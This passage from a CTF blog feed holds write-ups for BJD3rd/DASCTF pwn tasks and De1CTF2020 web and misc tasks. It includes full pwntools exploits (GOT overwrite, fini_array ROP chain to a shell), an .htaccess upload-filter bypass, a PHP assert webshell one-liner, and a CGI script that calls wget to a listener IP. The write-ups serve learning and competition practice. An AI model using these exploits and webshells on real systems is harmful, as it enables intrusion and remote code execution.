    <id>https://sncker.github.io/blog/2020/05/26/BJD3rnd-DASCTF-WriteUp/</id>
    <published>2020-05-26T12:25:00.000Z</published>
    <updated>2020-09-24T11:49:14.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="TaQini-OJ-0"><a href="#TaQini-OJ-0" class="headerlink" title="TaQini OJ 0"></a>TaQini OJ 0</h2><p>没附件，盲打，nc上去。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png" alt=""><br>一个OJ系统，可以编译运行写的C代码，提示输出<code>Hello TaQini</code>，按要求写一段C后给了flag的路径<code>/home/ctf/flag</code><br>然后很自然的尝试了<code>system(&quot;cat /home/ctf/flag&quot;)</code>发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">char buff[128]=&#123;0&#125;, file[128]=&#123;0&#125;;</span></span><br><span class="line"><span class="string">scanf(&quot;%s&quot;, file);</span></span><br><span class="line"><span class="string">FILE* fp = fopen(file, &quot;r&quot;);</span></span><br><span class="line"><span class="string">fscanf(fp, &quot;%s&quot;, buff);</span></span><br><span class="line"><span class="string">printf(&quot;%s&quot;, buff);</span></span><br><span class="line"><span class="string">return 0</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&#x27;@&#x27;)&quot;</span>, program)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;(Y/n)&quot;</span>, <span class="string">&quot;/home/ctf/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><p>用输入来绕过flag的过滤。<br>看其它师傅的wp用包含秒了两道OJ题。。。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;/home/ctf/f\</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">lag&quot;</span>@</span></span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200526205834.png" alt=""><br>任意地址写。找了一下发现<code>system(&quot;/bin/sh&quot;)</code>。想办法跳过去执行。<br>checksec开了Canary保护，利用任意地址写Hajack掉got里的<code>__stack_chk_fail</code>地址，然后覆盖canary即可.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;Memory_Monster_I&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;Memory_Monster_I&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;183.129.189.60&quot;, 10081)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendafter(<span class="string">&quot;addr:&quot;</span>, p64(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;data:&quot;</span>, p64(<span class="number">0x000000000040124A</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory_Monster_II"></a>Memory_Monster_II</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200527094827.png" alt=""><br>静态编译去符号。字符串窗口找类似”addr:”这种串，跟着引用找到main函数。看一下和第一题是差不多的，任意地址写。checksec发现只有NX，没开canary。但仔细看一下rbp-8的v5，在return前有个判断，其实就是canary。没check出来估计是去了符号的原因。按第一题的做法也是可以的，但是我没有，因为找<code>__stack_chk_fail</code>函数真是太可怕了。<br>这里就是劫持<code>fini_array</code>。<br>原理就是，首先程序入口并不是main函数，平时调试都会发现main的返回地址在<code>libc_start_main</code>里，然后它的函数原型是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini)</span><br></pre></td></tr></table></figure><p>参数有三个函数指针，main,init,fini，其中init是main前调用的，fini是main后调用的。<br>而我们利用的点就在fini里边。fini调用的函数是<code>__libc_csu_fini</code>，它里面有个<code>fini_array</code>，存放两个函数指针，顺序是先执行<code>fini_array[1]</code>，再执行<code>fini_array[0]</code>。<br>我们利用的思路是：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0] &#x3D; __libc_csu_fini  </span><br><span class="line">fini_array[1] &#x3D; main</span><br></pre></td></tr></table></figure><p>这样就可以循环执行main，解决数据写入量少的问题。<br>然后就是部署Rop。One_gadget梭不出来，自己ROPgadget一个个找。<br>找完之后将Rop部署在<code>fini_array+0x10</code>的地方，然后打断循环，并将栈迁移到我们部署的Rop上。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0] &#x3D; gadget: leave;ret</span><br><span class="line">fini_array[1] &#x3D; gadget: ret</span><br></pre></td></tr></table></figure><p>main执行完就会执行<code>fini_array[0]</code>，leave之后rsp就到了<code>fini_array+0x8</code>，这样放一个ret到<br><code>fini_array+0x8</code>就可以执行<code>fini_array+0x10</code>的Rop_chain上了。<br>先找<code>__libc_csu_fini</code>的地址，跟一个start函数，按照参数顺序对应的r8寄存器。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200527165533.png" alt=""><br>跟进找<code>fini_array</code>的地址。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200527165720.png" alt=""><br>静态链接找gadget随便找。0x3b号系统调用<code>execve(&quot;/bin/sh&quot;, 0, 0)</code><br>最后代码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;Memory_Monster_II&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;183.129.189.60&quot;, 10100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4b80b0</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402cb0</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000492895</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401C1D</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401746</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x000000000044baf9</span></span><br><span class="line">syscall_0x3b = <span class="number">0x000000000046efe0</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401cf3</span></span><br><span class="line">ret = <span class="number">0x0000000000401cf4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;addr:&quot;</span>, p64(fini_array))</span><br><span class="line">io.sendafter(<span class="string">&quot;data:&quot;</span>, p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">rop_chain = [</span><br><span class="line">p64(pop_rdi),</span><br><span class="line">p64(bin_sh_addr),</span><br><span class="line">p64(pop_rdx_rsi),</span><br><span class="line">p64(<span class="number">0</span>),</span><br><span class="line">p64(<span class="number">0</span>),</span><br><span class="line">p64(syscall_0x3b)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_chain)):</span><br><span class="line">io.sendafter(<span class="string">&quot;addr:&quot;</span>, p64(fini_array+<span class="number">0x10</span>+i*<span class="number">8</span>))</span><br><span class="line">io.sendafter(<span class="string">&quot;data:&quot;</span>, rop_chain[i])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;addr:&quot;</span>, p64(fini_array))</span><br><span class="line">io.sendafter(<span class="string">&quot;data:&quot;</span>, p64(leave_ret) + p64(ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;TaQini-OJ-0&quot;&gt;&lt;a href=&quot;#TaQini-OJ-0&quot; class=&quot;headerlink&quot; title=&quot;TaQini OJ 0&quot;&gt;&lt;/a&gt;TaQini OJ 0&lt;/h2&gt;&lt;p&gt;没附件，盲打，nc上去。&lt;br&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/20200526203246.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;一个OJ系统，可以编译运行写的C代码，提示输出&lt;code&gt;Hello TaQini&lt;/code&gt;，按要求写一段C后给了flag的路径&lt;code&gt;/home/ctf/flag&lt;/code&gt;&lt;br&gt;然后很自然的尝试了&lt;code&gt;system(&amp;quot;cat /home/ctf/flag&amp;quot;)&lt;/code&gt;发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。  &lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(log_level=&lt;span class=&quot;string&quot;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;, arch=&lt;span class=&quot;string&quot;&gt;&amp;quot;amd64&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io = remote(&lt;span class=&quot;string&quot;&gt;&amp;quot;183.129.189.60&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10075&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;program = &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;int main()&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;	char buff[128]=&amp;#123;0&amp;#125;, file[128]=&amp;#123;0&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;	scanf(&amp;quot;%s&amp;quot;, file);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;	FILE* fp = fopen(file, &amp;quot;r&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;	fscanf(fp, &amp;quot;%s&amp;quot;, buff);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;	printf(&amp;quot;%s&amp;quot;, buff);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;	return 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#125;@&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io.sendlineafter(&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;#x27;@&amp;#x27;)&amp;quot;&lt;/span&gt;, program)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io.sendlineafter(&lt;span class=&quot;string&quot;&gt;&amp;quot;(Y/n)&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;/home/ctf/flag&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="2020" scheme="https://sncker.github.io/blog/tags/2020/"/>
    
    <category term="BJD3rdCTF" scheme="https://sncker.github.io/blog/tags/BJD3rdCTF/"/>
    
    <category term="DASCTF" scheme="https://sncker.github.io/blog/tags/DASCTF/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF2020-WriteUp</title>
    <link href="https://sncker.github.io/blog/2020/05/05/De1CTF-2020-WriteUp/"/>
    <id>https://sncker.github.io/blog/2020/05/05/De1CTF-2020-WriteUp/</id>
    <published>2020-05-05T09:45:00.000Z</published>
    <updated>2020-08-26T01:47:00.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两天的自闭De1CTF我只想说，真的太棒了，题目质量很高，水准真的没得说，学到不少东西。也看到了一些国外著名战队，膜拜一下，白天国内师傅疯狂上分，半夜又轮到国外的师傅，很激烈。当然国内外都有师傅通宵干哈哈哈。<br>相比之下ISCC2020我也没啥好说的了，国内的CTF环境真的是个迷。不管怎样，还是希望国内这一块越走越好吧。不过起码De1CTF还是咱们国内的社区承办的<br>然后博主也是很有自知之明，去当个分母而已，就死磕最多人解出的两道题（非签到），其它的看都不看了just do it。  </p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505205921.png" alt=""><br>一道上传题。<br>简单的测了一下过滤。<br>首先文件名过滤ph。<br>文件内容过滤perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!<br>然后也通过Content-Type判断文件格式。<br>发现环境是  </p><blockquote><p>Server: Apache/2.4.6 (CentOS) PHP/5.4.16</p></blockquote><p>找了一下存在CVE-2017-15715漏洞，但是不顶用，因为ph被过滤了。<br>最后就是改Content-Type: image/jpeg就可以上传任意文件了，但是内容被限制了，像php这种也是被过滤的。<br>就想到短标签，采用&lt;?。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505211036.png" alt=""><br>然后就是解析，首先这里是没有明显的可以用来包含的地方。然后因为可以上传任意文件，就想到了用.htaccess来解析。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505211415.png" alt=""><br>但是，改解析的内容也包含了php，传不上去。。。<br>哭了，疯狂地搜索htaccess的奇淫技巧，看到了一篇利用htaccess调用CGI执行命令的文章。<br><a href="https://www.freebuf.com/vuls/218495.html">https://www.freebuf.com/vuls/218495.html</a><br>然后看到过滤里是没有bash的，兴奋起来了。<br>按照文章的思路测试<br>上传.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure><p>再上传1.xx，要验证命令是否执行，我用wget来请求我的监听服务器。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">wget 111.111.111.111:12345</span><br></pre></td></tr></table></figure><p>访问1.xx<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505212523.png" alt=""><br>500了，服务器监听也没结果。然后我上传一张正常的图片，正常访问，说明.htaccess文件格式没错。<br>那是不是没有wget呢，于是我又测试了nc，一样没反应。同样的也测试了FastCGI，都不行。然后就放弃了这条思路，和胜利擦肩而过，回想一下这点错就错在使用了不靠谱的方法来检验命令执行。<br>回到解析的思路上，因为前面有CVE-2017-15715的换行绕过黑名单，所以这里想到这个htaccess可以不可以用换行来绕过过滤。<br>于是我尝试了直接回车换行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><p>以及插入一个0x0A。区别就是直接在内容中回车是回车换行\r\n两个字节也就是0x0D和0x0A，直接插入0x0A就只是换行。<br>但是都不行，全部500了，说明格式错误了。到这里是彻底放弃了。又和胜利擦肩而过，但凡再搜一下htaccess的换行方式也不会这么惨了哈哈。。<br>然后接下来是别人的wp了orz，先说预期解。<br>预期解还真是用CGI调用来执行命令。先看一个比较正规的CGI编程解。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;</span><br><span class="line">echo &quot;&quot; #空行，结束头</span><br><span class="line">echo cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>反正我是复现不出来，依旧500。<br>但是有个国外的师傅发现虽然是500状态码，但是命令已经执行了，他利用的是touch 123.txt，然后访问发现确实创建了文件最后通过cp /flag ./flag.txt获取flag。但我按照他的思路也复现不了，不过还是不得不佩服一下，毕竟自己没想到这个简单的验证思路。<br>然后就是非预期解了，这个是真的可惜。<br>非预期确确实实是htaccess换行绕过，但是却是这样的。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><p>真的自闭了啊。<br>然后复现也踩坑了，短标签&lt;?是不解析的，linux下默认关闭，但win是默认开启的。搞得我一度怀疑自己被针对。但是&lt;?=是可以解析的。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>assert(<span class="variable">$_POST</span>[<span class="string">&quot;test&quot;</span>]);</span><br></pre></td></tr></table></figure><p>我也不知道为啥我的@eval也用不了，真的脸太黑了？唉T.T<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505222840.png" alt=""><br>最后没啥好说的了。通读三篇官方文档，做了一点点测试和总结。<br><a href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a><br><a href="https://www.php.net/manual/zh/language.basic-syntax.phptags.php">https://www.php.net/manual/zh/language.basic-syntax.phptags.php</a><br><a href="https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag">https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag</a><br>首先短标签是需要开启short_open_tag的，linux默认是关闭的，但是php5.4后&lt;?=短标签总是可用的，而&lt;?则受这项设置影响。<br>因为有参考一道类似题，SUCTF2019的同名题，所以我想到了既然可以上传任意文件，那我是否可以上传.user.ini来开启短标签呢？但是测试不成功，我从官方文档找到失败的可能原因就是php.ini里的一项设置。  </p><blockquote><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 </p></blockquote><p>也就是说.user.ini并不是实时生效的，而题目的环境5分钟重置一次，所以很难验证。<br>官方文档有说，apache的htaccess可以达到.user.ini的同样效果，经过我的搜索，找到了php_value的设置方法。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value short_open_tag 1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505223214.jpg" alt=""></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc-Chowder"><a href="#Misc-Chowder" class="headerlink" title="Misc_Chowder"></a>Misc_Chowder</h2><p>下放文件也是用的googledrive。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505180223.png" alt=""><br>下载下来是一个Misc_Chowder.pacp流量包，直接WireShark分析。过滤出http，发现上传动作。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505191751.png" alt=""><br>看到在120开头的ip里上传了6次图片，1.jpg,2.jpg…<br>还原出来1.jpg发现是正常图片，感觉是干扰的，然后在流量末尾发现往另一个ip上传一张7.png<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505192335.png" alt=""><br>还原出来是一个网盘的链接的图片。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505192728.png" alt=""><br>提取网站下载文件，一个readme.zip，里面有一个readme.docx，打开看一下只有两个表情包。。。这个也没啥考点了，改zip后缀用压缩程序打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505193452.png" alt=""><br>提取出压缩包，里面是一张图片，发现加密。根据举办方的hint，按格式DE****进行破解，跑了20多分钟得到密码：DE34Q1<br>解压得到图片。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505193823.png" alt=""><br>。。。。。。看了一下这张图片大小有28k，用binwalk看一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194238.png" alt=""><br>有个RAR压缩包，加个e参数分解一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194444.png" alt=""><br>RAR里两个txt都没用，fake flag。<br>然后就是第一大坑。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194734.png" alt=""><br>这张写着“I AM FLAG”的666.jpg，它其实是一张png，让我一度认为flag在它这里，我一顿分析，各种常规套路都试了。<br>最后挂在这里了。后来看师傅们的wp，竟然是ADS隐写。。。<br>回到RAR压缩包，重新审视这个RAR，用winhex打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201053.png" alt=""><br>在末尾可以发现一个fffffffflllll.txt的文件名，这个STM是NTFS ADS的一种标记头，ADS的格式都是”宿主文件”:”附属文件”，dir /r才可以看到。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201632.png" alt=""></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad <span class="number">666</span>.jpg:fffffffflllll.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201905.png" alt=""><br>最后说一下第二大坑，测试发现只有用winrar解压出来才能还原出这个交换数据流。orz</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前两天的自闭De1CTF我只想说，真的太棒了，题目质量很高，水准真的没得说，学到不少东西。也看到了一些国外著名战队，膜拜一下，白天国内师傅疯狂上分，半夜又轮到国外的师傅，很激烈。当然国内外都有师傅通宵干哈哈哈。&lt;br&gt;相比之下ISCC2020我也没啥好说的了，国内的CTF环境真的是个迷。不管怎样，还是希望国内这一块越走越好吧。不过起码De1CTF还是咱们国内的社区承办的&lt;br&gt;然后博主也是很有自知之明，去当个分母而已，就死磕最多人解出的两道题（非签到），其它的看都不看了just do it。  &lt;/p&gt;</summary>
    
    
    
